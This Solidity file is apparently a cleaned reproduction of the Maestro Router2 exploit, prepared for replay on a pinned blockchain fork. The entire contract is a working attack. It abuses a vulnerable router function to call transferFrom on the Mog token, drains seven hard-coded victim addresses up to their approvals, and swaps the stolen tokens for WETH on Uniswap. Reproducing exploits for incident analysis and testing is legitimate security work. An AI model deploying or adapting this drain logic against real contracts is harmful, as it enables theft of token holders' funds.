// SPDX-License-Identifier: UNLICENSED
// Cleaned for the plain EVM recorder (removed forge Test / CheatCodes / logs).
// Mirrors test/MaestroRouter2_exp.sol::testExploit() 1:1 for the profit path:
// the original attack body uses NO cheatcode other than `cheats.rollFork(...)`
// (a fork-state jump that is a no-op here since anvil_state.json already
// pins the replay at that exact block) and `emit log_named_decimal_uint(...)`
// (cosmetic). Both are dropped; the router-drain + Uniswap dump logic below
// is otherwise identical, including victim addresses and call ordering.
pragma solidity ^0.8.10;

import "./../interface.sol";

contract MaestroRouter2Exploit {
    address router = 0x80a64c6D7f12C47B7c66c5B4E20E72bc1FCd5d9e;
    IERC20 Mog = IERC20(0xaaeE1A9723aaDB7afA2810263653A34bA2C21C7a);
    Uni_Router_V2 UniRouter = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    function attack() external {
        address[] memory victims = new address[](7);
        victims[0] = 0x4189ad9624F838eef865B09a0BE3369EAaCd8f6F;
        victims[1] = 0xD0b4EE02E9bA15b9dac916d2CCAbaD50F836B24D;
        victims[2] = 0xe84180bdc970c01B30a326f610F110acB23EcdBe;
        victims[3] = 0x6476425a65Ae09e22383B68416b32AbE62896aa9;
        victims[4] = 0x942beCA935703058E26527d0bD49D00E85841772;
        victims[5] = 0x968907878bDF60638FFdD5E4759289941333bf94;
        victims[6] = 0xA5162195e6CB7483eea8bA878d147b0E90519c64;
        bytes4 vulnFunctionSignature = hex"9239127f";
        for (uint256 i = 0; i < victims.length; i++) {
            uint256 allowance = Mog.allowance(victims[i], address(router));
            uint256 balance = Mog.balanceOf(victims[i]);
            balance = allowance < balance ? allowance : balance;
            bytes memory transferFromData =
                abi.encodeWithSignature("transferFrom(address,address,uint256)", victims[i], address(this), balance);
            bytes memory data = abi.encodeWithSelector(vulnFunctionSignature, address(Mog), transferFromData, uint8(0), false);
            (bool success,) = address(router).call(data);
            success;
        }
        uint256 MogBalance = Mog.balanceOf(address(this));

        address[] memory path = new address[](2);
        path[0] = address(Mog);
        path[1] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        Mog.approve(address(UniRouter), MogBalance);
        UniRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            MogBalance, 0, path, address(this), block.timestamp
        );
    }
}
